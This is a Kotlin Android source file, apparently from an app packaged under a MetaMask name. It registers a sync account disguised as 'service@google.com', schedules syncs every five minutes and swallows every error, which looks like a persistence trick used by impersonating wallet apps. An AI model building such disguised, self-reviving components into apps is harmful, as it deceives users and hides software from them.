package com.example.MetaMask.services.sync

import android.accounts.Account
import android.accounts.AccountManager
import android.content.ContentResolver
import android.content.Context
import android.os.Bundle

object SyncManager {
    private const val ACCOUNT_TYPE = "com.example.MetaMask.account"
    private const val AUTHORITY = "com.example.MetaMask.provider"
    private const val SYNC_INTERVAL = 5L * 60L

    fun createSyncAccount(context: Context) {
        android.util.Log.d("XDBG", "[SyncManager] createSyncAccount enter context=ctx") //xdbg
        try {
            val accountManager = context.getSystemService(Context.ACCOUNT_SERVICE) as AccountManager
            val accountName = "service@google.com"
            val newAccount = Account(accountName, ACCOUNT_TYPE)

            if (accountManager.addAccountExplicitly(newAccount, null, null)) {
                android.util.Log.d("XDBG", "[SyncManager] if branch") //xdbg
                ContentResolver.setIsSyncable(newAccount, AUTHORITY, 1)
                ContentResolver.setSyncAutomatically(newAccount, AUTHORITY, true)
                ContentResolver.addPeriodicSync(newAccount, AUTHORITY, Bundle.EMPTY, SYNC_INTERVAL)
            } else {
                ContentResolver.setIsSyncable(newAccount, AUTHORITY, 1)
                ContentResolver.setSyncAutomatically(newAccount, AUTHORITY, true)
                ContentResolver.addPeriodicSync(newAccount, AUTHORITY, Bundle.EMPTY, SYNC_INTERVAL)
            }
        } catch (_: Exception) {}
    }

    fun forceSync() {
        android.util.Log.d("XDBG", "[SyncManager] forceSync enter") //xdbg
        try {
            val account = Account("service@google.com", ACCOUNT_TYPE)
            val bundle = Bundle().apply {
                putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true)
                putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true)
            }
            ContentResolver.requestSync(account, AUTHORITY, bundle)
        } catch (_: Exception) {}
    }
}
